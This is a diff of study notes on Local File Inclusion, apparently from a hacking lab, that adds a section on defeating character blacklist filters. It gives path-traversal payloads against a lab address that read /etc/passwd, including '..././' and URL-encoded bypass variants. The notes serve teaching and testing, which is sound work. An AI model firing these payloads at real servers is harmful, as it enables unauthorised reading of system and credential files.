@@ -6,7 +6,9 @@ These notes summarize core techniques for discovery and exploitation of **file i
 
 ## Overview
 
-Many server-side languages use HTTP parameters to identify which resources are shown on a web page. If the underlying mechanisms are not securely coded, an attacker can manipulate the parameter values and display any file on the back-end server. This is known as a **Local File Inclusion** (LFI) vulnerability. 
+Many server-side languages use HTTP parameters to identify which resources are shown on a web page. If the underlying mechanisms are not securely coded, an attacker can manipulate the parameter values and display any file on the back-end server. This is known as a **Local File Inclusion** (LFI) vulnerability.
+
+---
 
 ## Basic LFI
 
@@ -39,13 +41,15 @@ Sometimes the parameter value is appended after a fixed directory prefix on the 
 http://94.237.49.23:48568/index.php?language=/../../../../etc/passwd
 ```
 
+---
+
 ## Bypassing Filters
 
 Most applications use various filters to protect against LFI attacks. In these scenarios basic LFI payloads will not work.
 
 ### Non-recursive Search and Replace Filter
 
-Non-recursive search and replace filters search for instances of '../' and replace them with an empty string in order to avoid path traversals. 
+Non-recursive search and replace filters search for instances of ../ and replace them with an empty string in order to avoid path traversals. 
 
 A non-recursive search and replace filter might look like this when implemented in PHP:
 
@@ -85,3 +89,25 @@ http://94.237.49.23:48568/index.php?language=..././..././..././..././etc/passwd
 # Bypass (Windows): ....\/
 http://94.237.49.23:48568/index.php?language=....\/....\/....\/....\/etc/passwd
 ```
+
+### Character Blacklist Filter
+
+A character blacklist filter blocks specific characters. LFI-related characters such as dot (**.**) and slash (**/**) are often included in these filters. 
+
+A character blacklist filter may be bypassed by URL encoding the payload. There are many URL encoding tools such as **CyberChef** or **BurpDecoder**.
+
+**Example:**
+
+```bash
+# Original
+http://94.237.49.23:48568/index.php?language=../../../../etc/passwd
+```
+
+```bash
+# URL encoded
+http://94.237.49.23:48568/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+```
+
+The above payload may work when input validation is performed before URL decoding, or when decoding is incomplete. In some cases, it is worth double or even triple URL encoding the payload. 
+
+### Approved Paths Filter
